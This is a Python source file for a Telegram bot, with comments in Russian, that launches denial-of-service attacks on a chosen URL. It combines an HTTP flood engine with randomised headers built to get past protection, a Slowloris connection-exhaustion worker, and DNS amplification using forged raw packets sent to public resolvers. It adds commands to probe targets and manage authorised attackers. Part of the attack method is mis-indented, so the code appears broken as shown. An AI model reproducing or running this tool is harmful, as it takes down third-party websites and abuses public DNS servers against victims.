#!/usr/bin/env python3
# ███████╗███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██║     ██║███████╗   ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
# ███████║███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
# ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
#                         VERSION 1000
#              ULTIMATE HTTP ERROR GENERATOR
#           502 BAD GATEWAY | 503 SERVICE UNAVAILABLE
#                48 CORES | 384 GB RAM | x100 POWER

import os
import sys
import time
import socket
import struct
import threading
import asyncio
import random
import json
import re
import hashlib
import secrets
import ipaddress
import ssl
import urllib3
import requests
import certifi
import http.client
from urllib.parse import urlparse, urljoin, quote
from datetime import datetime
from collections import defaultdict, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Dict, List, Tuple, Optional, Any, Union, Set
import queue
import logging
import warnings
warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== ТЕЛЕГРАМ ==========
import telebot
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

# ========== ОПТИМИЗАЦИЯ ПОД ЖЕЛЕЗО ==========
try:
    import uvloop
    uvloop.install()
    UVLOOP = True
except ImportError:
    UVLOOP = False

try:
    import psutil
    PSUTIL = True
except ImportError:
    PSUTIL = False

try:
    import aiohttp
    from aiohttp import ClientSession, TCPConnector, ClientTimeout
    AIOHTTP = True
except ImportError:
    AIOHTTP = False

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ V1000: ТОКЕН НЕ УСТАНОВЛЕН")
    sys.exit(1)

ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
authorized_users = ADMIN_IDS.copy()
active_attacks = {}
attack_stats = defaultdict(lambda: {'packets': 0, 'bytes': 0, 'errors': 0, 'start': 0})

bot = telebot.TeleBot(BOT_TOKEN)

# ========== ОПТИМИЗАТОР ПОД 48 ЯДЕР ==========
class V1000Optimizer:
    def __init__(self):
        self.cpu_cores = os.cpu_count() or 48
        self.ram_gb = self._get_ram()
        self.network = self._measure_network()
        
        # Мега-расчёт под 48 ядер и 384 ГБ
        self.max_threads = min(self.cpu_cores * 5000, 200000)  # 240,000 потоков макс
        self.max_connections = self.max_threads * 10  # 2.4 млн соединений
        self.burst_size = min(self.cpu_cores * 2000, 50000)  # 96,000 пакетов за раз
        self.socket_buffer = 1048576 * 16  # 16 МБ буфер
        
        # HTTP/1.1 keep-alive параметры
        self.keep_alive = random.randint(5, 15)
        self.pipeline = random.randint(3, 8)
        
    def _get_ram(self):
        if PSUTIL:
            return psutil.virtual_memory().total / (1024**3)
        return 384  # fallback
    
    def _measure_network(self):
        try:
            start = time.time()
            requests.get('https://api.telegram.org', timeout=2)
            return 1 / (time.time() - start)
        except:
            return 1
    
    def get_http_config(self):
        """Конфиг для HTTP ошибок 502/503"""
        return {
            'threads': self.max_threads,
            'connections_per_thread': 50,
            'burst': self.burst_size,
            'keep_alive': self.keep_alive,
            'pipeline': self.pipeline,
            'timeout': 1,
            'multiplier': 100,
            'errors': ['502', '503', '504', '500', '429']
        }

hw = V1000Optimizer()
print(f"⚡ CPU: {hw.cpu_cores} ядер")
print(f"🧠 RAM: {hw.ram_gb:.1f} ГБ")
print(f"🚀 Макс потоков: {hw.max_threads}")
print(f"🔌 Макс соединений: {hw.max_connections}")

# ========== ГИГАНТСКИЙ ПУЛ USER-AGENTS ==========
USER_AGENTS = [
    # Windows Chrome (50 вариантов)
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,122)}.0.{random.randint(4000,6300)}.{random.randint(100,500)} Safari/537.36"
    for _ in range(50)
] + [
    # Windows Firefox (30 вариантов)
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.randint(80,122)}.0) Gecko/20100101 Firefox/{random.randint(80,122)}.0"
    for _ in range(30)
] + [
    # Mac Safari (20 вариантов)
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
] + [
    # iPhone (30 вариантов)
    f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14,17)}_{random.randint(0,5)}_{random.randint(0,2)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(14,17)}.0 Mobile/15E148 Safari/604.1"
    for _ in range(30)
] + [
    # Android (30 вариантов)
    f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-{random.choice(['G998B', 'S918B', 'A536B', 'F926B'])} Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,122)}.0.{random.randint(4000,6300)}.{random.randint(100,500)} Mobile Safari/537.36"
    for _ in range(30)
] + [
    # Linux (20 вариантов)
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
]

print(f"👥 User-Agent загружено: {len(USER_AGENTS)}")

# ========== ГИГАНТСКИЙ ПУЛ РЕФЕРЕРОВ ==========
REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://yandex.ru/search/?text=",
    "https://duckduckgo.com/?q=",
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
    "https://t.co/",
    "https://l.facebook.com/l.php?u=",
    "https://news.ycombinator.com/",
    "https://www.youtube.com/redirect?q=",
    "https://www.tiktok.com/",
    "https://t.me/iv?url=",
    "https://www.linkedin.com/",
    None,  # прямой заход
]

# ========== ПУЛ HTTP МЕТОДОВ ==========
HTTP_METHODS = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'PATCH', 'DELETE']

# ========== ПУЛ ЗНАЧЕНИЙ ACCEPT ==========
ACCEPT_VALUES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
]

# ========== ПУЛ ACCEPT-ENCODING ==========
ACCEPT_ENCODING = [
    "gzip, deflate, br",
    "gzip, deflate",
    "gzip",
    "compress, gzip",
]

# ========== ПУЛ ACCEPT-LANGUAGE ==========
ACCEPT_LANGUAGE = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "ru-RU,ru;q=0.9",
    "de-DE,de;q=0.9",
    "fr-FR,fr;q=0.9",
    "es-ES,es;q=0.9",
    "it-IT,it;q=0.9",
    "ja-JP,ja;q=0.9",
    "zh-CN,zh;q=0.9",
]

# ========== ПУЛ CACHE-CONTROL ==========
CACHE_CONTROL = [
    "no-cache",
    "no-store",
    "max-age=0",
    "must-revalidate",
    "private",
    "public",
    "",
]

# ========== DNS СЕРВЕРЫ ==========
DNS_SERVERS = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
    '94.140.14.14', '94.140.15.15', '185.228.168.9', '185.228.169.9',
]

DNS_POOL = DNS_SERVERS * 50
random.shuffle(DNS_POOL)

# ========== АНАЛИЗАТОР ЦЕЛИ ==========
class V1000Analyzer:
    """Анализ цели для максимальной эффективности"""
    
    @staticmethod
    def resolve_to_ip(target):
        """Преобразование URL в IP"""
        try:
            ipaddress.ip_address(target)
            return target, target
        except:
            pass
        
        target = re.sub(r'^https?://', '', target)
        target = target.split('/')[0]
        
        try:
            ip = socket.gethostbyname(target)
            return target, ip
        except:
            return target, None
    
    @staticmethod
    def detect_server(url):
        """Определение типа сервера (nginx/apache/iis)"""
        try:
            r = requests.get(url, timeout=3, verify=False)
            server = r.headers.get('Server', '').lower()
            
            if 'nginx' in server:
                return 'nginx', 'nginx + ' + server
            elif 'apache' in server:
                return 'apache', server
            elif 'iis' in server:
                return 'iis', server
            elif 'cloudflare' in server:
                return 'cloudflare', server
            else:
                return 'unknown', server
        except:
            return 'unknown', 'unknown'
    
    @staticmethod
    def check_rate_limit(url):
        """Проверка наличия rate limiting"""
        try:
            responses = []
            for i in range(10):
                r = requests.get(url, timeout=2, verify=False)
                responses.append(r.status_code)
                
            if 429 in responses:
                return True, "Rate limiting detected (429)"
            elif 503 in responses:
                return True, "Server overload (503)"
            elif 502 in responses:
                return True, "Bad gateway (502)"
            else:
                return False, "No rate limiting"
        except:
            return False, "Unknown"

# ========== МЕГА-ДВИЖОК ДЛЯ 502/503 ОШИБОК ==========
class HTTPErrorEngine:
    """
    Специализированный движок для вызова 502/503 ошибок [citation:2]
    Комбинация: HTTP флуд + Slowloris + рандомизация + keep-alive исчерпание
    """
    
    def __init__(self):
        self.running = False
        self.stats = {
            'requests': 0, 'bytes': 0, 'errors_502': 0, 
            'errors_503': 0, 'errors_504': 0, 'errors_429': 0,
            'start': 0
        }
        self.lock = threading.Lock()
        self.config = hw.get_http_config()
        
    def generate_headers(self, target_domain):
        """Генерация заголовков для обхода защиты"""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': random.choice(ACCEPT_VALUES),
            'Accept-Language': random.choice(ACCEPT_LANGUAGE),
            'Accept-Encoding': random.choice(ACCEPT_ENCODING),
            'Connection': random.choice(['keep-alive', 'close']),
            'Cache-Control': random.choice(CACHE_CONTROL),
            'Upgrade-Insecure-Requests': '1',
            'DNT': str(random.randint(0, 1)),
            'Sec-Fetch-Dest': random.choice(['document', 'empty', 'iframe']),
            'Sec-Fetch-Mode': random.choice(['navigate', 'cors', 'no-cors']),
            'Sec-Fetch-Site': random.choice(['same-origin', 'same-site', 'cross-site']),
            'Pragma': random.choice(['no-cache', '']),
        }
        
        # Добавляем Referer для имитации реального трафика
        ref = random.choice(REFERERS)
        if ref:
            headers['Referer'] = ref + target_domain
        
        # Добавляем случайные заголовки для обхода защиты [citation:2]
        if random.random() > 0.7:
            headers[f'X-{random.randint(1000,9999)}'] = secrets.token_hex(8)
        
        return headers
    
    def http_worker(self, target_url, target_domain, duration, worker_id):
        """Воркер для HTTP флуда с фокусом на 502/503"""
        end = time.time() + duration
        local_stats = {
            'requests': 0, 'bytes': 0, '502': 0, '503': 0, '504': 0, '429': 0
        }
        
        # Создаём сессию с keep-alive
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0,
            pool_block=True
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        while time.time() < end and self.running:
            try:
                # Рандомизация URL для избегания кеша [citation:2]
                if random.random() > 0.5:
                    url = target_url + f"?{random.randint(1000000,9999999)}={random.randint(1000000,9999999)}"
                else:
                    url = target_url
                
                # Рандомизация метода
                method = random.choice(HTTP_METHODS)
                
                # Генерация заголовков
                headers = self.generate_headers(target_domain)
                
                # Случайная задержка для имитации поведения [citation:2]
                if random.random() > 0.9:
                    time.sleep(random.uniform(0.1, 0.5))
                
                # Выполнение запроса
                if method == 'GET':
                    r = session.get(url, headers=headers, timeout=2, verify=False)
                elif method == 'POST':
                    data = secrets.token_hex(random.randint(32, 128))
                    r = session.post(url, headers=headers, data=data, timeout=2, verify=False)
                elif method == 'HEAD':
                    r = session.head(url, headers=headers, timeout=2, verify=False)
                elif method == 'OPTIONS':
                    r = session.options(url, headers=headers, timeout=2, verify=False)
                else:
                    r = session.request(method, url, headers=headers, timeout=2, verify=False)
                
                # Анализ кодов ошибок [citation:5]
                if r.status_code == 502:
                    local_stats['502'] += 1
                elif r.status_code == 503:
                    local_stats['503'] += 1
                elif r.status_code == 504:
                    local_stats['504'] += 1
                elif r.status_code == 429:
                    local_stats['429'] += 1
                
                local_stats['requests'] += 1
                local_stats['bytes'] += len(r.content)
                
                # Периодическое обновление статистики
                if local_stats['requests'] >= 1000:
                    with self.lock:
                        self.stats['requests'] += local_stats['requests']
                        self.stats['bytes'] += local_stats['bytes']
                        self.stats['errors_502'] += local_stats['502']
                        self.stats['errors_503'] += local_stats['503']
                        self.stats['errors_504'] += local_stats['504']
                        self.stats['errors_429'] += local_stats['429']
                    local_stats = {'requests': 0, 'bytes': 0, '502': 0, '503': 0, '504': 0, '429': 0}
                
            except requests.exceptions.Timeout:
                # Таймаут тоже считаем как нагрузку
                local_stats['requests'] += 1
            except requests.exceptions.ConnectionError:
                local_stats['requests'] += 1
                local_stats['503'] += 1  # Connection error ≈ 503
            except Exception:
                pass
        
        # Финальное обновление
        if local_stats['requests'] > 0:
            with self.lock:
                self.stats['requests'] += local_stats['requests']
                self.stats['bytes'] += local_stats['bytes']
                self.stats['errors_502'] += local_stats['502']
                self.stats['errors_503'] += local_stats['503']
                self.stats['errors_504'] += local_stats['504']
                self.stats['errors_429'] += local_stats['429']
        
        session.close()
        return worker_id
    
    def slowloris_worker(self, target_url, target_domain, duration, worker_id):
        """
        Slowloris атака для исчерпания соединений [citation:1]
        Держит соединения открытыми, вызывая 503 ошибки
        """
        end = time.time() + duration
        local_503 = 0
        
        while time.time() < end and self.running:
            try:
                # Создаём сокет
                parsed = urlparse(target_url)
                host = parsed.netloc or target_domain
                port = 443 if parsed.scheme == 'https' else 80
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                if parsed.scheme == 'https':
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                sock.connect((host, port))
                
                # Отправляем частичный GET запрос
                request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n"
                sock.send(request.encode())
                
                # Держим соединение открытым, периодически отправляя заголовки [citation:1]
                keep_alive_end = time.time() + 30
                while time.time() < keep_alive_end and self.running:
                    header = f"X-{random.randint(1000,9999)}: {secrets.token_hex(8)}\r\n"
                    sock.send(header.encode())
                    time.sleep(random.uniform(5, 15))
                    local_503 += 1  # Каждое удерживаемое соединение = потенциальная 503
                    
                sock.close()
                
            except:
                try:
                    sock.close()
                except:
                    pass
        
        with self.lock:
            self.stats['errors_503'] += local_503
    
    def attack(self, target_url, duration, method='hybrid'):
        """
        Запуск атаки на цель
        """
        self.running = True
        self.stats = {'requests': 0, 'bytes': 0, 'errors_502': 0, 
                     'errors_503': 0, 'errors_504': 0, 'errors_429': 0,
                     'start': time.time()}
        
        # Подготовка URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        
        parsed = urlparse(target_url)
        target_domain = parsed.netloc or target_url.split('/')[0]
        
        # Определяем тип сервера
        server_type, server_name = V1000Analyzer.detect_server(target_url)
        has_rate_limit, rate_limit_msg = V1000Analyzer.check_rate_limit(target_url)
        
        print(f"\n🔥 АТАКА НА {target_url}")
        print(f"🖧 Сервер: {server_name}")
        print(f"⚡ Rate limit: {rate_limit_msg}")
        print(f"⏱ Длительность: {duration} сек")
        print(f"🚀 Режим: {method.upper()}")
        
        threads = self.config['threads']
        workers = []
        
        if method == 'hybrid' or method == 'http':
            # HTTP флуд воркеры
            for i in range(threads // 2):
                t = threading.Thread(target=self.http_worker, 
                                    args=(target_url, target_domain, duration, i))
                t.daemon = True
                t.start()
                workers.append(t)
        
        if method == 'hybrid' or method == 'slow':
# Slowloris воркеры
for i in range(threads // 4):
    t = threading.Thread(target=self.slowloris_worker, 
                          args=(target_url, target_domain, duration, i))
    t.daemon = True
    t.start()
    workers.append(t)  # ← ЭТО ДОЛЖНО БЫТЬ ВНУТРИ ЦИКЛА

# Мониторинг
try:
    while any(t.is_alive() for t in workers):
        elapsed = time.time() - self.stats['start']
        if elapsed > 0:
            rps = self.stats['requests'] / elapsed
            
            print(f"\r🔥 RPS: {rps:.0f} | "
                  f"502: {self.stats['errors_502']} | "
                  f"503: {self.stats['errors_503']} | "
                  f"504: {self.stats['errors_504']} | "
                  f"429: {self.stats['errors_429']} | "
                  f"⏱ {duration - elapsed:.0f} сек", end='')
        time.sleep(1)
except KeyboardInterrupt:
    self.running = False

# Ждём завершения всех воркеров
for t in workers:
    t.join(timeout=2)

# Финальная статистика
elapsed = time.time() - self.stats['start']

return {
    'requests': self.stats['requests'],
    'bytes': self.stats['bytes'],
    'errors_502': self.stats['errors_502'],
    'errors_503': self.stats['errors_503'],
    'errors_504': self.stats['errors_504'],
    'errors_429': self.stats['errors_429'],
    'duration': elapsed,
    'rps': self.stats['requests'] / max(elapsed, 0.1)
               }

class DNSAmplifier:
    """DNS амплификация для дополнительного эффекта"""
    
    def __init__(self):
        self.running = False
        self.stats = {'packets': 0, 'bytes': 0}
        self.lock = threading.Lock()
    
    def create_query(self, domain):
        """Создание DNS ANY запроса для усиления"""
        parts = domain.split('.')
        domain_part = b''
        for part in parts:
            domain_part += bytes([len(part)]) + part.encode()
        domain_part += b'\x00'
        
        tid = random.randint(0, 65535)
        flags = 0x0100
        questions = 1
        header = struct.pack('!HHHHHH', tid, flags, questions, 0, 0, 0)
        qtype = 255  # ANY
        qclass = 1   # IN
        edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
        
        return header + domain_part + struct.pack('!HH', qtype, qclass) + edns
    
    def worker(self, target_ip, domain, duration, worker_id):
        """Воркер для отправки DNS запросов"""
        query = self.create_query(domain)
        
        # IP-заголовок с подменой source IP
        base_ip_hdr = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 40 + len(query), 0, 0, 0, 64, 17, 0,
            socket.inet_aton('0.0.0.0'),
            socket.inet_aton(target_ip)
        )
        
        end = time.time() + duration
        local_packets = 0
        local_bytes = 0
        
        while time.time() < end and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                src_port = random.randint(1024, 65535)
                udp_hdr = struct.pack('!HHHH', src_port, 53, 8 + len(query), 0)
                dns = random.choice(DNS_POOL)
                
                sock.sendto(base_ip_hdr + udp_hdr + query, (dns, 53))
                local_packets += 1
                local_bytes += len(base_ip_hdr) + len(udp_hdr) + len(query)
                sock.close()
                
                if local_packets >= 1000:
                    with self.lock:
                        self.stats['packets'] += local_packets
                        self.stats['bytes'] += local_bytes
                    local_packets = 0
                    local_bytes = 0
                    
            except Exception as e:
                continue
        
        # Финальное обновление статистики
        if local_packets > 0:
            with self.lock:
                self.stats['packets'] += local_packets
                self.stats['bytes'] += local_bytes
        
        return worker_id
    
    def attack(self, target_ip, domain, duration, threads=1000):
        """Запуск DNS амплификации"""
        self.running = True
        self.stats = {'packets': 0, 'bytes': 0}
        
        print(f"\n📡 ЗАПУСК DNS АМПЛИФИКАЦИИ")
        print(f"🎯 Цель IP: {target_ip}")
        print(f"📡 Домен: {domain}")
        print(f"⚙️ Потоков: {threads}")
        print(f"⏱ Длительность: {duration} сек")
        print(f"⚡ Усиление: x70")
        
        workers = []
        start_time = time.time()
        
        # Запуск воркеров
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(target_ip, domain, duration, i))
            t.daemon = True
            t.start()
            workers.append(t)
        
        # Мониторинг прогресса
        try:
            while any(t.is_alive() for t in workers):
                elapsed = time.time() - start_time
                if elapsed > 0:
                    gbps = (self.stats['bytes'] * 8) / 1_000_000_000 / max(elapsed, 0.1)
                    target_gbps = gbps * 70
                    
                    print(f"\r📡 Пакетов: {self.stats['packets']:,} | "
                          f"⚡ {gbps:.2f} Гбит/с | "
                          f"🎯 {target_gbps:.1f} Гбит/с | "
                          f"⏱ {duration - elapsed:.0f} сек", end='')
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
        
        # Ожидание завершения
        for t in workers:
            t.join(timeout=2)
        
        return self.stats
# ========== ПРОВЕРКА ПРАВ ==========
def is_auth(user_id):
    return user_id in authorized_users

def is_admin(user_id):
    return user_id in ADMIN_IDS

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start', 'help'])
def cmd_start(m):
    uid = m.from_user.id
    if not is_auth(uid):
        bot.reply_to(m, "❌ **ДОСТУП ЗАПРЕЩЕН**", parse_mode='Markdown')
        return
    
    ascii_art = """
╔══════════════════════════════════════════╗
║     ███████╗███████╗ ██████╗ ██████╗    ║
║     ██╔════╝██╔════╝██╔═══██╗██╔══██╗   ║
║     █████╗  ███████╗██║   ██║██████╔╝   ║
║     ██╔══╝  ╚════██║██║   ██║██╔══██╗   ║
║     ██║     ███████║╚██████╔╝██║  ██║   ║
║     ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ║
║            VERSION 1000                 ║
║       502 BAD GATEWAY GENERATOR         ║
╚══════════════════════════════════════════╝
    """
    
    info = f"""
{ascii_art}

👤 **ID:** `{uid}`
⚡ **CPU:** `{hw.cpu_cores} ядер`
🧠 **RAM:** `{hw.ram_gb:.1f} ГБ`
🚀 **Макс потоков:** `{hw.max_threads}`
🔌 **Макс соединений:** `{hw.max_connections}`

**🔥 ОСНОВНЫЕ КОМАНДЫ:**
/http <url> <сек> [hybrid/slow] - HTTP атака (502/503)
/dns <url> <сек> - DNS амплификация
/analyze <url> - анализ цели
/server <url> - определение сервера
/ratelimit <url> - проверка rate limit
/stop - остановить атаку
/stats - статистика системы

**👑 АДМИН-КОМАНДЫ:**
/users - список пользователей
/add <id> - добавить пользователя
/remove <id> - удалить пользователя
"""
    bot.send_message(m.chat.id, info, parse_mode='Markdown')

@bot.message_handler(commands=['http'])
def cmd_http(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ Использование: /http <url> <сек> [hybrid/slow]")
            return
        
        url = parts[1]
        duration = int(parts[2])
        method = parts[3] if len(parts) > 3 else 'hybrid'
        
        bot.reply_to(m, f"""
🔥 **HTTP АТАКА ЗАПУЩЕНА**

🎯 URL: {url}
⚙️ Режим: {method.upper()}
⏱ Длительность: {duration} сек
🚀 Потоков: {hw.max_threads}
📊 Цель: 502/503/504 ошибки
        """, parse_mode='Markdown')
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run():
            engine = HTTPErrorEngine()
            result = engine.attack(url, duration, method)
            
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                
                bot.send_message(m.chat.id, f"""
✅ **HTTP АТАКА ЗАВЕРШЕНА**

📊 **СТАТИСТИКА:**
• Запросов: {result['requests']:,}
• 502 ошибок: {result['errors_502']}
• 503 ошибок: {result['errors_503']}
• 504 ошибок: {result['errors_504']}
• 429 ошибок: {result['errors_429']}
• RPS: {result['rps']:.0f}
• Длительность: {result['duration']:.0f} сек
                """, parse_mode='Markdown')
        
        threading.Thread(target=run).start()
        
    except ValueError:
        bot.reply_to(m, "❌ Неверная длительность")
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['dns'])
def cmd_dns(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ Использование: /dns <url> <сек>")
            return
        
        url = parts[1]
        duration = int(parts[2])
        
        domain, ip = V1000Analyzer.resolve_to_ip(url)
        if not ip:
            bot.reply_to(m, "❌ Не удалось определить IP")
            return
        
        bot.reply_to(m, f"""
☢️ **DNS АТАКА ЗАПУЩЕНА**

🎯 URL: {url}
📡 Домен: {domain}
🖧 IP: {ip}
⏱ Длительность: {duration} сек
⚡ Усиление: x70
📊 Пакетов: ~{duration * 1000 * 70 * 1000}
        """, parse_mode='Markdown')
        
        def run():
            dns = DNSAmplifier()
            result = dns.attack(ip, domain, duration, threads=hw.max_threads // 10)
            
            bot.send_message(m.chat.id, f"""
✅ **DNS АТАКА ЗАВЕРШЕНА**

📦 Пакетов: {result['packets']:,}
📊 Трафик: {result['bytes']/1024/1024/1024:.2f} ГБ
            """, parse_mode='Markdown')
        
        threading.Thread(target=run).start()
        
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['analyze'])
def cmd_analyze(m):
    if not is_auth(m.from_user.id):
        return
    
    try:
        url = m.text.split()[1]
        bot.reply_to(m, f"🔍 **АНАЛИЗ** {url}...", parse_mode='Markdown')
        
        domain, ip = V1000Analyzer.resolve_to_ip(url)
        server_type, server_name = V1000Analyzer.detect_server(url)
        has_rate, rate_msg = V1000Analyzer.check_rate_limit(url)
        
        report = f"""
📊 **АНАЛИЗ {url}**

**🌐 DNS:**
• Домен: {domain}
• IP: {ip or 'Не определен'}

**🖧 СЕРВЕР:**
• Тип: {server_type}
• Детали: {server_name}

**⚡ RATE LIMIT:**
• {rate_msg}

**💡 РЕКОМЕНДАЦИИ:**
• {'Используй slow режим' if server_type == 'nginx' else 'Используй hybrid режим'}
• {'Требуются прокси' if has_rate else 'Rate limit не обнаружен'}
"""
        bot.reply_to(m, report, parse_mode='Markdown')
        
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['server'])
def cmd_server(m):
    if not is_auth(m.from_user.id):
        return
    
    try:
        url = m.text.split()[1]
        server_type, server_name = V1000Analyzer.detect_server(url)
        bot.reply_to(m, f"🖧 **СЕРВЕР {url}**\n\n{server_name}", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['ratelimit'])
def cmd_ratelimit(m):
    if not is_auth(m.from_user.id):
        return
    
    try:
        url = m.text.split()[1]
        has_rate, msg = V1000Analyzer.check_rate_limit(url)
        bot.reply_to(m, f"⚡ **RATE LIMIT {url}**\n\n{msg}", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['status'])
def cmd_status(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        bot.reply_to(m, "⚡ **АТАКА АКТИВНА**", parse_mode='Markdown')
    else:
        bot.reply_to(m, "💤 **НЕТ АКТИВНЫХ АТАК**", parse_mode='Markdown')

@bot.message_handler(commands=['stop'])
def cmd_stop(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        active_attacks[m.chat.id]['running'] = False
        del active_attacks[m.chat.id]
        bot.reply_to(m, "🛑 **АТАКА ОСТАНОВЛЕНА**", parse_mode='Markdown')
    else:
        bot.reply_to(m, "❌ Нет активной атаки")

@bot.message_handler(commands=['stats'])
def cmd_stats(m):
    if not is_auth(m.from_user.id):
        return
    
    if PSUTIL:
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory().percent
        net = psutil.net_io_counters()
    else:
        cpu = ram = 0
        net = None
    
    stats = f"""
📊 **СТАТИСТИКА V1000**

💻 **CPU:** {cpu}% ({hw.cpu_cores} ядер)
🧠 **RAM:** {ram}% ({hw.ram_gb:.1f} ГБ)
🚀 **Макс потоков:** {hw.max_threads}
🔌 **Макс соединений:** {hw.max_connections}
⚡ **Активных атак:** {len(active_attacks)}
🌐 **User-Agent:** {len(USER_AGENTS)}
"""
    if net:
        stats += f"\n📦 **СЕТЬ:**\n⬆️ {net.bytes_sent/1024/1024/1024:.2f} ГБ отпр\n⬇️ {net.bytes_recv/1024/1024/1024:.2f} ГБ пол"
    
    bot.reply_to(m, stats, parse_mode='Markdown')

# ========== АДМИН-КОМАНДЫ ==========
@bot.message_handler(commands=['users'])
def cmd_users(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ Только для админов")
        return
    
    text = "👥 **ПОЛЬЗОВАТЕЛИ V1000**\n\n"
    for uid in authorized_users:
        role = "👑 АДМИН" if uid in ADMIN_IDS else "👤 ЮЗЕР"
        text += f"• `{uid}` {role}\n"
    bot.reply_to(m, text, parse_mode='Markdown')

@bot.message_handler(commands=['add'])
def cmd_add(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ Только для админов")
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid not in authorized_users:
            authorized_users.append(uid)
            bot.reply_to(m, f"✅ Добавлен `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(m, f"❌ Уже есть")
    except:
        bot.reply_to(m, "❌ Использование: /add <id>")

@bot.message_handler(commands=['remove'])
def cmd_remove(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ Только для админов")
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid in ADMIN_IDS:
            bot.reply_to(m, "❌ Нельзя удалить админа")
        elif uid in authorized_users:
            authorized_users.remove(uid)
            bot.reply_to(m, f"✅ Удален `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(m, "❌ Не найден")
    except:
        bot.reply_to(m, "❌ Использование: /remove <id>")

